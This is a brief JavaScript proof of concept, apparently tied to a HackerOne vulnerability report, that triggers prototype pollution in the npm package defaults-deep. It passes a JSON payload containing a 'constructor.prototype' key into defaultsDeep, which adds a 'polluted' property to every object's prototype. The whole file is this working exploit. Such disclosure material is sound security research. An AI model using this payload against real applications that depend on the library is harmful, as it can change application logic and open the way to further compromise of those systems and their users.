//https://hackerone.com/reports/380878
const defaultsDeep = require('defaults-deep');

let obj = {}

let payload = JSON.parse('{"constructor": {"prototype": {"polluted": "yes"}}}');
defaultsDeep({}, payload);
